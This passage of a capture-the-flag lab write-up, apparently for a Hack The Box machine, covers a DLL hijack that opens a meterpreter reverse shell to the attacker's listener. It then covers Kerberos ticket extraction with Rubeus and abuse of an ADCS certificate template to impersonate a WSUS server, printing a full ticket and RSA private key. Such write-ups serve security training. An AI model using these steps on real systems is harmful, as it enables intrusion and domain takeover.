&#x20;                              NT AUTHORITY\\SYSTEM:(I)(F)

&#x20;                              NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F)

&#x20;                              BUILTIN\\Administrators:(I)(F)

&#x20;                              BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)

&#x20;                              BUILTIN\\Users:(I)(RX)

&#x20;                              BUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE)

&#x20;                              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)

&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

- 🔍 *The Output shows that Every User From IT OU has full access over this File, Since msa_health$ doesn't belongs to IT$ group, The IT$ Group has only one User jaylee.clifto.*

```text
*Evil-WinRM* PS C:\\Program Files> icacls "C:\\Program Files\\UpdateMonitor\\UpdateMonitor.exe"

C:\\Program Files\\UpdateMonitor\\UpdateMonitor.exe logging\\IT:(I)(F)

&#x20;                                                NT AUTHORITY\\SYSTEM:(I)(F)

&#x20;                                                BUILTIN\\Administrators:(I)(F)

&#x20;                                                BUILTIN\\Users:(I)(RX)

&#x20;                                                APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)

&#x20;                                                APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

- 🔍 *Also we can't access the .exe file as well, since only member from IT group can modify it through inherited Permissions!, means we cannot directly replace the executable!*

- 🔍 *Since there is only 1 member in IT group jaylee.clifto, that means this executable might be running as user jaylee.clifto*

- 🔍 *well While looking at the ProgramData Folder, i found a Logs file for UpdateMonitor!*

```text
*Evil-WinRM* PS C:\\ProgramData\\UpdateMonitor\\Logs> cat monitor.log

[2026-04-16 16:41:18] Starting Sentinel Update Check...

[2026-04-16 16:41:18] Checking for update on core server...

[2026-04-16 16:41:18] Info: Core did not find file Settings_Update.zip

[2026-04-16 16:41:18] Last status: File not found on core

[2026-04-16 16:41:18] Checking for update on local server...

[2026-04-16 16:41:18] No updates found locally: C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip.

[2026-04-16 16:41:18] Loading update applier: C:\\Program Files\\UpdateMonitor\\bin\\settings_update.dll

[2026-04-16 16:41:18] Failed to load settings_update.dll. Error code: 126
```

- 🔍 *Interesting! So there this UpdateMonitor.exe loads a Settings_update.zip file from C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip path, and then extracts it and maybe runs it in C:\\Program Files\\UpdateMonitor\\bin\\settings_update.dll*

- 🔍 *Attack Plan:-*

```text
&#x20;> Will Create a dll file with Reverse Shell to our nc listener

&#x20;> Will convert it to .zip format

&#x20;> Will upload the file into  C:\\ProgramData\\UpdateMonitor as Settings_Update.zip

&#x20;> The Scheduled Task will extract the zip file and load it into C:\\Program Files\\UpdateMonitor\\bin\\settings_update.dll

&#x20;> The file get executed as jaylee.clifto!
```

- 🔍 *Lets Begin!*

- 🔍 *Start With Creating a .dll file with reverse shell payload*

```bash
msfvenom -p windows/meterpreter/reverse_tcp \\

&#x20;   LHOST="your_ip" LPORT=6666 \\

&#x20;   -f dll -o settings_update.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

[-] No arch selected, selecting arch: x86 from the payload

No encoder specified, outputting raw payload

Payload size: 354 bytes

Final size of dll file: 9216 bytes

Saved as: settings_update.dll
```

- 🔍 *Set Up a MS listener*

```bash
sudo msfconsole -q \\

&#x20;   -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 6666; run"

[*] Using configured payload generic/shell_reverse_tcp

payload => windows/meterpreter/reverse_tcp

LHOST => tun0

LPORT => 6666

[*] Started reverse TCP handler on 10.10.14.****:6666
```

- 🔍 *Convert the dll into zip*

```text
&#x20;zip Settings_Update.zip settings_update.dll

updating: settings_update.dll (deflated 82%)
```

- 🔍 *Upload The file!*

```text
*Evil-WinRM* PS C:\\ProgramData\\UpdateMonitor> upload Settings_Update.zip

&#x20;

Info: Uploading /home/kali/HTB/Season-10/Logging/Settings_Update.zip to C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip

&#x20;

Data: 2432 bytes of 2432 bytes copied

&#x20;

Info: Upload successful!
```

- 🔍 *Check Listener!*

```text
[*] Sending stage (188998 bytes) to 10.129.44.87

[*] Meterpreter session 1 opened (10.10.14.****:6666 -> 10.129.44.87:61364) at 2026-04-23 14:27:36 +0000

meterpreter > getuid

**Server username: logging\\jaylee.clifton**
```

- 🔍 *Also check At the logs*

```text
[2026-04-23 14:53:15] Successfully unzipped update to C:\\Program Files\\UpdateMonitor\\bin\\

[2026-04-23 14:53:15] Loading update applier: C:\\Program Files\\UpdateMonitor\\bin\\settings_update.dll

\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 3 - Privsec

- 🔍 *As the meterprete shell doesn't supports the powershell for this user, we need to get its TGT in order enumerate!*

- 🔍 *Upload Rubeus.exe to meterprete shell*

```text
upload /home/kali/Tools/Rubeus/Rubeus/Rubeus.exe C:\\\\Users\\\\Public

[*] Uploading  : /home/kali/Tools/Rubeus/Rubeus/Rubeus.exe -> C:\\temp\\Rubeus.exe

[*] Completed  : /home/kali/Tools/Rubeus/Rubeus/Rubeus.exe -> C:\\temp\\Rubeus.exe
```

- 🔍 *Now get the TGT*

```text
Type Shell and enter

and then-->

C:\\temp>.\\Rubeus.exe tgtdeleg /nowrap

.\\Rubeus.exe tgtdeleg /nowrap

&#x20;  ______        _

&#x20; (_____ \\      | |

&#x20;  _____) )_   _| |__  _____ _   _  ___

&#x20; |  __  /| | | |  _ \\| ___ | | | |/___)

&#x20; | |  \\ \\| |_| | |_) ) ____| |_| |___ |

&#x20; |_|   |_|____/|____/|_____)____/(___/

&#x20; v2.3.3

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'

[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.logging.htb'

[+] Kerberos GSS-API initialization success!

[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.

[*] Found the AP-REQ delegation ticket in the GSS-API output.

[*] Authenticator etype: aes256_cts_hmac_sha1

[*] Extracted the service ticket session key from the ticket cache: oc2Y1Y3mE9r22OwIvilr5lhxTMTOnr9QRkQpAWTM/QU=

[+] Successfully decrypted the authenticator

[*] base64(ticket.kirbi):

&#x20;     **doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuinaHjSnK4H3+76qTnTuJtdNPVj9GkpJW0kBE8SsQu7ulvVA/HuqBdu5LnwTcopvyeqlhU1xwT3X6a/5D+c/H8Zu0MC+NboZSJq4E+vkoZiaxNa9e2eyk8BQ1kl5Jv/OKKnLp5GFRCMvbYX82HEyan94aR5+pzC38RmGJv4fhkso+iRbWTluA0kRJpPXVE3BAMR50hbJXH+VwJZy7kR32+1EYK/vJeqwpDmGh/mgma8XwUf5wdd7NqPs3rixtVZoHEeb7C0wnIf780xdGDdH2weEM5AVZzUwDS2P5RJhSnYnSKUIcDZeBNWGUE16Y1PIoFr7cM9RBn9raG7qKosXe0mXRWsAt7jus8eR0RLA4zJKB35J8e0hTLtYjw3dXFOk3zJ98yzYR72agfuD5b2SqdHITg55EWVyMLQFVJGz44zuL0o30FBwCYFJQtvh6eb99SL8tq6dhsQA4Ha9VtHEAk/btvHh7Su0ESSnwU4CfNp7/0qbB5ueCm5KzSgFtzFSEzKL4OHEnnmroRjFpWoZNElZ/H8eyLE/8kLKhXoVL4mcWy/dR/fRErMWmjH+71txB6eXaylR0bCtFF81afH5joHjAPDLxbfyLFOWa5XYiCeJcYr+/NX1ojqeSWdHN2Ql31NZUTiMVHZeg2HnZZU9L4b+QpKVwWk3BI3jYhLCBCYQrIFvYJHiAsevhtJxUm3Jmt9sbZNqjoBx/0R8Kvyr7dMWpUoWf4aDRm3IsNR4l3gGqRgURip2A0svqh6x5laGTtK6RqXAg3DtUFSXEq4fFsaMACcxENlsIUcbTtDYxKiOiCaMfRqYmX90sYvLlzwknBojqFJQkUMsCgO06YgxKVuYoaxwHZm6+jzmQdO5O5RUXesonq7lYjOx4hvJxXySzihieZp4m8VTYHn+8qplbnw+Fkh8V+omVy6ocHV/5ZLVjCB4PeMjakBKs2hhvj0S4gR/j9gVNokooIwCn1RIfkyBpo/69iqy+D3himqRALjuyzSpxJTJbtWjFRThPwlN5wTb+rMLlyMNC8mReesXs0m+oSoRKuwd2UIaMSb2Vivfvq59XbfD3B26wRGE04F32gyzkQpgbJn7hPCygGWJ6imECPTewOziXqGrtzg+V2rs9cIHlrLMuLnOndIPInhfSKVplef4fVvs+swfR1Vm/0GrTXsOLnFhKDK0i+bZ5Pp/ekIrrO0/cmThMJqvk2PTAzeOk/5TUVF+3e55n47s6mFzcGXH4x9SRJ+c/OXe2xU2Zq9OYOzwgvN0AtWrt+5PeVk0sOHFD8ZrOvuftWMvADbj1VowpZ+KqBGX5a4FZAUKtdSb0SAPPFWrXU7P8KOVwkw/xkOp8F1TwqhVn+bbHr1bgFaXuscGncIHBWshASanobqty0iNx/SN7BxmAlCO7hqx5GSHxA7IH4188F7ieKVvcrXInn6jpcQzPhtchXmY0YnvY0Mu7dXUw8BCatjdW23ZHAQ8G6YaGPR+0O9kqcMfPo82tIkffRNoJrYDRo4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgYTO9mSJfirf3Z6DaIicdVmCJmWPCFzrSFxtMkJHsmXKhDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDQyNDIxMzcwOFqmERgPMjAyNjA0MjUwNzMyMTVapxEYDzIwMjYwNTAxMjEzMjE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=**
```

- 🔍 *Now save this in a .kirbi file*

```bash
echo -n 'BASE64_HERE' | tr -d ' \\r\\n\\t' | base64 -d > jaylee.kirbi
```

- 🔍 *Convert now*

```bash
ticketConverter.py jaylee.kirbi jaylee.ccache

Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...

[+] done
```

- 🔍 *Export and Ensure!*

```bash
export KRB5CCNAME=jaylee.ccache

klist

Ticket cache: FILE:jaylee.ccache

Default principal: jaylee.clifton@LOGGING.HTB

Valid starting       Expires              Service principal

04/24/2026 21:37:08  04/25/2026 07:32:15  krbtgt/LOGGING.HTB@LOGGING.HTB

&#x20;       renew until 05/01/2026 21:32:15
```

- 🔍 *We are good to enumerate now!*

- 🔍 *Now for enumeration there isn't a clear path in bloodhound, like no clear outbounds and permissions.*

- 🔍 *Also i have found i ADCS Misconfiguration.*

```bash
C:\\Users\\Public>certutil -v -template UpdateSrv

certutil -v -template UpdateSrv

&#x20; Name: Active Directory Enrollment Policy

&#x20; Id: {342BA86E-C468-4862-B006-668E3F9B36A0}

&#x20; Url: ldap:

34 Templates:

&#x20; Template[29]:

&#x20; **TemplatePropCommonName = UpdateSrv**

&#x20; TemplatePropFriendlyName = UpdateSrv

&#x20; TemplatePropEKUs =

1 ObjectIds:

&#x20;   1.3.6.1.5.5.7.3.1 Server Authentication

&#x20; TemplatePropCryptoProviders =

&#x20;   0: Microsoft RSA SChannel Cryptographic Provider

&#x20;   1: Microsoft DH SChannel Cryptographic Provider

&#x20; TemplatePropMajorRevision = 64 (100)

&#x20; TemplatePropDescription = Computer

&#x20; TemplatePropSchemaVersion = 2

&#x20; TemplatePropMinorRevision = 3

&#x20; TemplatePropRASignatureCount = 0

&#x20; TemplatePropMinimumKeySize = 800 (2048)

&#x20; TemplatePropOID =

&#x20;   1.3.6.1.4.1.311.21.8.12353791.10602463.14107544.5621390.7746408.154.13283525.179965 UpdateSrv

&#x20; TemplatePropV1ApplicationPolicy =

1 ObjectIds:

&#x20;   1.3.6.1.5.5.7.3.1 Server Authentication

&#x20; TemplatePropEnrollmentFlags = 0

&#x20; TemplatePropSubjectNameFlags = 1

&#x20;   **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1**

&#x20; TemplatePropPrivateKeyFlags = 1010000 (16842752)

&#x20;   CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0

&#x20;   TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)

&#x20;   TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)

&#x20; TemplatePropGeneralFlags = 20241 (131649)

&#x20;   CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1

&#x20;   CT_FLAG_MACHINE_TYPE -- 40 (64)

&#x20;   CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)

&#x20;   CT_FLAG_IS_MODIFIED -- 20000 (131072)

&#x20; TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-4020823815-2796529489-1682170552-519D:PAI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4020823815-2796529489-1682170552-2102)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4020823815-2796529489-1682170552-519)(A;;LCRPRC;;;S-1-5-21-4020823815-2796529489-1682170552-2102)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-4020823815-2796529489-1682170552-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;LCRPLORC;;;AU)

&#x20;   Allow Enroll        logging\\IT

&#x20;   Allow Enroll        logging\\Domain Admins

&#x20;   Allow Enroll        logging\\Enterprise Admins

&#x20;   Allow Read  logging\\IT

&#x20;   Allow Full Control  logging\\Domain Admins

&#x20;   Allow Full Control  logging\\Enterprise Admins

&#x20;   Allow Full Control  logging\\Administrator

&#x20;   Allow Read  NT AUTHORITY\\Authenticated Users

&#x20; TemplatePropExtensions =

4 Extensions:

&#x20; Extension[0]:

&#x20;   1.3.6.1.4.1.311.21.7: Flags = 0, Length = 30

&#x20;   Certificate Template Information

&#x20;       Template=UpdateSrv(1.3.6.1.4.1.311.21.8.12353791.10602463.14107544.5621390.7746408.154.13283525.179965)

&#x20;       Major Version Number=100

&#x20;       Minor Version Number=3

&#x20; Extension[1]:

&#x20;   2.5.29.37: Flags = 0, Length = c

&#x20;   Enhanced Key Usage

&#x20;       Server Authentication (1.3.6.1.5.5.7.3.1)

&#x20; Extension[2]:

&#x20;   2.5.29.15: Flags = 1(Critical), Length = 4

&#x20;   Key Usage

&#x20;       Digital Signature, Key Encipherment (a0)

&#x20; Extension[3]:

&#x20;   1.3.6.1.4.1.311.21.10: Flags = 0, Length = e

&#x20;   Application Policies

&#x20;       [1]Application Certificate Policy:

&#x20;            Policy Identifier=Server Authentication

&#x20; TemplatePropValidityPeriod = 10 Years

&#x20; TemplatePropRenewalPeriod = 6 Weeks

CertUtil: -Template command completed successfully.
```

> [!IMPORTANT]
> What is ADCS? - Active Directory Certificate Services (AD CS) is a Windows Server role that allows an organization to act as its own Certificate Authority (CA). It provides a native Public Key Infrastructure (PKI) to issue, manage, and revoke digital certificates used for secure communication, device authentication, and data encryption

- 🔍 *Hence we Found a Custom UpdateSrv Certificate and as it has, the  **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1** Flag enabled, means we can ask for The Certificate using any Alternative Which is know as Subject Alternative Name (SAN). means we can also Request for the  Certificate using a Hight Privileged object's name! (Such as Administrator!)*

- 🔍 *We can do give it a shot, by trying to ask for a certificate using Administrator's Identity!*

```bash
C:\\Users\\Public>.\\Certify.exe request /ca:dc01.logging.htb\\logging-DC01-CA /template:UpdateSrv /altname:Administrator

&#x20;  _____          _   _  __

&#x20; / ____|        | | (_)/ _|

&#x20;| |     ___ _ __| |_ _| |_ _   _

&#x20;| |    / _ \\ '__| __| |  _| | | |

&#x20;| |___|  __/ |  | |_| | | | |_| |

&#x20; \\_____\\___|_|   \\__|_|_|  \\__, |

&#x20;                            __/ |

&#x20;                           |___./

&#x20; v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : logging\\jaylee.clifton

[*] No subject name specified, using current context as subject.

[*] Template                : UpdateSrv

[*] Subject                 : CN=jaylee.clifton, CN=Users, DC=logging, DC=htb

[*] AltName                 : Administrator

[*] Certificate Authority   : dc01.logging.htb\\logging-DC01-CA

[*] CA Response             : The certificate had been issued.

[*] Request ID              : 7

[*] cert.pem         :

\-----BEGIN RSA PRIVATE KEY-----

MIIEowIBAAKCAQEA2Qmzm5A6BryuvYLnl4aX7+eae5BUGX5BPqcHYUvCWw1HfEK/

....

\-----END RSA PRIVATE KEY-----

\-----BEGIN CERTIFICATE-----

MIIGsTCCBJmgAwIBAgITFAAAAAcsvudjmXMKUAABAAAABzANBgkqhkiG9w0BAQsF

.....

\-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:05.0553377
```

- 🔍 *Okay Got the Certificate!*

- 🔍 *as we got the certificate we can ask for the TGT for admin using Rebueus!*

```text
PS C:\\ProgramData> .\\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Password123! /ptt

&#x20;  ______        _

&#x20; (  __  )      | |

&#x20; | |__) | _   _| |__   ___  _   _  ___

&#x20; |  __  /( ) ( )  _  \\/  _ \( ) ( )  _  \\

&#x20; | |  \\ \\| |_| | |_)  |  __/| |_| | ( ) |

&#x20; (_)  (_)\\____/|_____/\\___| \\____/(_) (_)

&#x20; v2.3.3

[*] Action: Ask TGT

[*] Got domain: logging.htb

**[*] Using PKINIT with etype rc4_hmac and subject: CN=jaylee.clifton, CN=Users, DC=logging, DC=htb**

[*] Building AS-REQ (w/ PKINIT preauth) for: 'logging.htb\\administrator'

[*] Using domain controller: ::1:88

[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN
```

- 🔍 *Shoot! this failed?*

- 🔍 *After Searching for a bit, i have understood why it failed, there are 2 main reasons for that!*

```text
&#x09;[1] --> The Subject Identity Mismatch:-

&#x09;		Look closely at the Rubeus output:[*] Using PKINIT with etype rc4_hmac and subject: CN=jaylee.clifton, CN=Users, DC=logging, DC=htb

&#x09;		Even though we supplied /altname:Administrator in our Certify request, the Certificate Authority (CA) completely ignored or stripped that value. The final 				certificate was generated with our low-privileged user identity (jaylee.clifton) inside the Subject field. When Rubeus tried to use that certificate to 				authenticate as the administrator account, the KDC rejected the request because the certificate identity (jaylee.clifton) did not match the requested Kerberos 				principal (administrator).

&#x09;[2] --> Missing Extended Key Usage (EKU)

&#x09;		 As confirmed by your earlier certutil scan, the UpdateSrv template is strictly configured for Server Authentication only (1.3.6.1.5.5.7.3.1).

&#x09;			For Rubeus to successfully execute asktgt via PKINIT, the certificate must possess either Client Authentication (1.3.6.1.5.5.7.3.2) or Smartcard Logon 					(1.3.6.1.4.1.311.20.2.2).

&#x09;			Because those properties are missing, the KDC refuses to issue a user session ticket (TGT) using this certificate, regardless of 							the account name specified.
```

- 🔍 *Now While looking at the Certutil Output Properly there are 4 attributes aligned!*

```text
&#x09;

&#x09;1. Enrollee Supplies Subject : True: The requester can define the identity properties of the issued certificate.

&#x09;2. Client Authentication : False (or missing): The certificate cannot be used to natively authenticate users via standard Kerberos/PKINIT (ruling out standard ESC1).

&#x09;3. Server Authentication : True (or specific application policies): The certificate is trusted to prove the cryptographic identity of server endpoints or applications.

&#x09;4. CT_FLAG_MACHINE_TYPE is enabled: The template is designed to mint identities for infrastructure objects (computers/servers) rather than human users.
```

- 🔍 *This Leads to an ESC17 Exposure, as it possess all the attributes.*

> [!IMPORTANT]
> ESC17 represents a shift from User Impersonation to Infrastructure / Server Spoofing.

```text
**Because Active Directory services often trust internal servers implicitly based on their machine certificates, obtaining a valid Server Authentication certificate for a critical network asset (wsus.logging.htb) removes the necessity of a direct user logon path. Instead, it allows an operator to insert an attacking system directly into the trust topology of the domain's update management cycle, leading to administrative control over systems contacting the rogue update server.**
```

> [!IMPORTANT]
> What is WSUS and how it will be helpful? -Windows Server Update Services (WSUS) is a free Microsoft server role that allows IT administrators to centrally manage and distribute software patches, security updates, and hotfixes to computers within a corporate network. It eliminates the need for every device to download updates individually directly from the internet.

> [!IMPORTANT]
> In enterprise environments, administrators create custom templates for specific IT operations. A template named UpdateSrv that is configured as a machine-type template with Server Authentication points directly to the environment's Windows Update Infrastructure (WSUS). The administrator designed this template so the update server could automatically request and renew its own SSL/TLS transport certificate

```text
&#x09;
```

- 🔍 *Also WSUS hold a Higher privilege Position in the AD*

> [!IMPORTANT]
> SYSTEM Level Access: Every computer in the domain periodically connects to the WSUS server, asks for software updates, and installs them automatically under the highest local privilege level: NT AUTHORITY\\SYSTEM.

> [!IMPORTANT]
> The Security Blind Spot: Ordinarily, computers reject untrusted update packages. However, because we can abuse UpdateSrv to generate a legitimate, CA-signed certificate for wsus.logging.htb, the client computers will implicitly trust our rogue server

- 🔍 *Lets look for the Registries first!*

```bash
C:\\Windows\\system32>reg query "HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer

reg query "HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer

HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate

&#x20;   **WUServer    REG_SZ    https://wsus.logging.htb:8531**
```

- 🔍 *We have discovered the WSUS!*

- 🔍 *Now we can request for a certificate with altname as wsus, as it is the only way to steal the identity of the update server, using UpdateSrv template!*

- 🔍 *Upload Certify.exe*

```text
meterpreter > upload /home/kali/Tools/Certipy/Ghostpack-CompiledBinaries/Certify.exe C:\\\\Users\\\\Public

[*] Uploading  : /home/kali/Tools/Certipy/Ghostpack-CompiledBinaries/Certify.exe -> C:\\Users\\Public\\Certify.exe

[*] Completed  : /home/kali/Tools/Certipy/Ghostpack-CompiledBinaries/Certify.exe -> C:\\Users\\Public\\Certify.exe
```

- 🔍 *Now--> Request the Certificate*

```bash
C:\\Users\\Public>Certify.exe request /ca:dc01.logging.htb\\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb

Certify.exe request /ca:dc01.logging.htb\\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb

&#x20;  _____          _   _  __

&#x20; / ____|        | | (_)/ _|

&#x20;| |     ___ _ __| |_ _| |_ _   _

&#x20;| |    / _ \\ '__| __| |  _| | | |

&#x20;| |___|  __/ |  | |_| | | | |_| |

&#x20; \\_____\\___|_|   \\__|_|_|  \\__, |

&#x20;                            __/ |

&#x20;                           |___./

&#x20; v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : logging\\jaylee.clifton

[*] No subject name specified, using current context as subject.

[*] Template                : UpdateSrv

[*] Subject                 : CN=jaylee.clifton, CN=Users, DC=logging, DC=htb

**[*] AltName                 : wsus.logging.htb**

[*] Certificate Authority   : dc01.logging.htb\\logging-DC01-CA

[*] CA Response             : The certificate had been issued.

[*] Request ID              : 14

[*] cert.pem         :

\-----BEGIN RSA PRIVATE KEY-----

MIIEowIBAAKCAQEA5cTZFo3SuGumlh3CxgvFPKg3NLk2mEc1AI/teTllCEXRCLs6

+ZP9ukvsirBcjJZ5WvRgUr5i/dIdc0tlyQVC7Z73hv2uhX5vTcbsKHfnxuHY9F56

RN0ragDj9uI5iAjKt4/6wqMwD/edfJeIhIab33/Mt2KZ/ZrhxFD8en0lFUQV1KUI

Rj6dLlOudu2gj1wHhRAI2IDLrJdOJ250/HraFKw4F1xQvePwtUI18WVtGuwA60fQ

cuw1VaQagh/7wPJrooQ9d+YsNlJVX+nT5/Ayzegxs5Ed/HzPA8GbYNpxgddFaOoE

ra9nPGuwPYLemSdc5Wfe9af3lMyj/qFK3MdM+QIDAQABAoIBAQC/cgsn3ber7hZ5

kgaOGZSX+9kz1vcEXqBs/X9yuD3UbMfFLKvw9Dw/E6/dxyD2CxLGlEQF7ZhxwLbF

MBd5LScc8o1wLsNRe42mEo8HERFQBzJMOsRJyLa5tlA7jzc8f4bY9+CKeIo9Y6YW

//PB6J7L1KJwUnnYc0qV1pzoOonBcstLpNtO5xUkIKGT+c9joRM6cB/j4I1Z44m3

d1XnyhVgoPF/hLUDsXFHbHvaVvXmx4+CRnVbM598wKOQljzmp5NAQoUlZcHnjhpa

f7mlLEv6xTW92CiXEl8Uy6ewHs0CMy60PiDA2NyyXqzYH6h2bsTPMgrNM9eaOunt

XVuvMFBZAoGBAPNOPaWYxQWn/5dsMrRH8c7o/xmFkAgvTCPbTaGssdvOUyDSr6rI

v/X873OHHzM3GrglCVUpld86lvs1sex8mD8T9imx6UbagLQgqMR0WjqhWaigR5Mn

e8ic5OB016qqoGE6JVMzcaDF2leZZen5Nb+LjRc9Wxk1k+Mk1ep1durHAoGBAPHB

zT6i7MKhjuY3hf84vSjU6Hcjm2fhnYwArpG8+yj/wxRcBTRcwWSQha0IjRc8iceR

/+zHPxbhOi7d5OWRDD0w7Lu9desoCwqHwEINDB1AjP7O3oKhpU5D7qVbigYiltpl

hZO2crTUe7pw6pfKPmQZh4wP9LWTVSAJiEZwKko/AoGAPk2Uv6jlGtOwQYg1W7Do

nMFRQanP/iiOaMgpkvL0AINPCiKpVSRe85C3iG/bb3P25ZymTSZ++FC6hM11KEen

fM+Rw4+JWtltB7MtRFE/IbBbkzCn42jC69YxTcDd0RgsRXlsQWf0+uRvSus/C7ED

MG99y6usfkIYApxWItm9f9UCgYBwss6SD3Nde+DYszN0+ac8nJvNxjyQ3Z0LAdpf

OADBaREwsYD/munQjoqyUhUrqt3zubzbTTq82Lu901T8K3TQJbmF/1k0CVO0Ufov

EFQAYvIXaqpRrTcZWBOs5BJgr8kxADiX1mp8n70Z+b9yiSYylbAZe+qwpoD9UVRE

uc8NEwKBgCtb7afh6SqPrJmX49VGU3Pb1qByT8uqEplzBBEWo+O6gVgx6z1j9NOc

noEJJ4g9gU+UPCCX0el7kKIrDtl+oXwE+UVunU1U961nULqRJe8aLjdupKg6Op8g

ook4TUAbGeK3o0qvNOo+3nHrLb+SOfkG452lTS8PHMULyKq/D4JI

\-----END RSA PRIVATE KEY-----

\-----BEGIN CERTIFICATE-----

MIIGtDCCBJygAwIBAgITFAAAAA4rbY7rj52g9wACAAAADjANBgkqhkiG9w0BAQsF

ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbG9nZ2lu

ZzEYMBYGA1UEAxMPbG9nZ2luZy1EQzAxLUNBMB4XDTI2MDUyNzEzMjQzMVoXDTM2

MDUyNDEzMjQzMVowVzETMBEGCgmSJomT8ixkARkWA2h0YjEXMBUGCgmSJomT8ixk

ARkWB2xvZ2dpbmcxDjAMBgNVBAMTBVVzZXJzMRcwFQYDVQQDEw5qYXlsZWUuY2xp

ZnRvbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOXE2RaN0rhrppYd

wsYLxTyoNzS5NphHNQCP7Xk5ZQhF0Qi7OvmT/bpL7IqwXIyWeVr0YFK+Yv3SHXNL

ZckFQu2e94b9roV+b03G7Ch358bh2PReekTdK2oA4/biOYgIyreP+sKjMA/3nXyX

iISGm99/zLdimf2a4cRQ/Hp9JRVEFdSlCEY+nS5TrnbtoI9cB4UQCNiAy6yXTidu

dPx62hSsOBdcUL3j8LVCNfFlbRrsAOtH0HLsNVWkGoIf+8Dya6KEPXfmLDZSVV/p

0+fwMs3oMbORHfx8zwPBm2DacYHXRWjqBK2vZzxrsD2C3pknXOVn3vWn95TMo/6h

StzHTPkCAwEAAaOCAoYwggKCMD0GCSsGAQQBgjcVBwQwMC4GJisGAQQBgjcVCIXy

gX+Fh49fht2HGILXjQ6D2OZogRqGquFFiv19AgFkAgEDMBMGA1UdJQQMMAoGCCsG

AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDAbBgkrBgEEAYI3FQoEDjAMMAoGCCsGAQUF

BwMBMB0GA1UdDgQWBBQ4HOHQXlJS+zmqXu+/z2o9gV7qUjArBgNVHREEJDAioCAG

CisGAQQBgjcUAgOgEgwQd3N1cy5sb2dnaW5nLmh0YjAfBgNVHSMEGDAWgBTObEaQ

Y5ibhfcquTBxErDJAlwxdDCBzQYDVR0fBIHFMIHCMIG/oIG8oIG5hoG2bGRhcDov

Ly9DTj1sb2dnaW5nLURDMDEtQ0EoMiksQ049REMwMSxDTj1DRFAsQ049UHVibGlj

JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE

Qz1sb2dnaW5nLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/

